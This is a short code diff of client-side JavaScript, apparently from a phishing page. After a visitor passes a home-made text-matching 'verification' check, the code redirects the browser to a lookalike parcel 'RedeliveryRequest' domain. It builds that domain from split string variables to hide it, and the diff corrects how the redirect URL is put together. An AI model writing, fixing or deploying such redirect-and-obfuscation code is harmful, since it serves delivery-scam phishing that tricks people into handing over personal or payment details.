@@ -39,8 +39,8 @@
     if (userInput.toLowerCase() === randomString.toLowerCase()) {
 	  let spark="chectrackuasbalikups"
 	  let https ="https"
-	  let webapp ="RedeliveryRequest/"
-      window.location= https+"://"+spark+"/"+webapp+".com"
+	  let webapp ="RedeliveryRequest"
+      window.location= https+"://"+spark+".com/"+webapp
 	  userInput.className = ''; // Remove the 'invalid' class
       errorMsg.textContent = '';
     } else {
